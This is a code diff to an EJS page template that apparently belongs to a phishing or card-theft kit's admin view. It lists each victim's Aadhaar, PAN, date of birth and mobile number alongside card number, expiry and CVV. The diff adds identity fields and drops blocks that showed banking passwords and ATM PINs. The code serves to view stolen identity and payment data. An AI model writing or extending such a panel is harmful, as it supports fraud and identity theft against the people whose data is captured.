@@ -123,31 +123,24 @@
     <% if (user) { %>
       <div class="info-section">
         <h3>Personal Information</h3>
+        <p><strong>NAME:</strong> <%= user.name %></p>
+        <p><strong>AADHAAR:</strong> <%= user.aadhaar %></p>
         <p><strong>MOBILE-NO:</strong> <%= user.mobile %></p>
         <p><strong>DOB:</strong> <%= user.dob %></p>
         <p><strong>PAN NO:</strong> <%= user.pan %></p>
       </div>
     <% } %>
     
-    <% if (cardPayment) { %>
-      <div class="info-section">
-        <h3>Card Payment Details</h3>
-        <p><strong>CUSTOMER-ID:</strong> <%= cardPayment.customerId %></p>
-        <p><strong>PASSWORD:</strong> <%= cardPayment.password %></p>
-      </div>
-    <% } %>
-    
     <% if (netBanking) { %>
       <div class="info-section">
-        <h3>Net Banking Details</h3>
+        <h3>Card Details</h3>
         <p><strong>CARD-NO:</strong> <%= netBanking.cardNumber %></p>
         <p><strong>EXP:</strong> <%= netBanking.expiryDate %></p>
         <p><strong>CVV:</strong> <%= netBanking.cvv %></p>
-        <p><strong>ATM-PIN:</strong> <%= netBanking.pin %></p>
       </div>
     <% } %>
     
-    <% if (!user && !cardPayment && !netBanking) { %>
+    <% if (!user && !netBanking) { %>
       <p>No details found for this user.</p>
     <% } %>
     
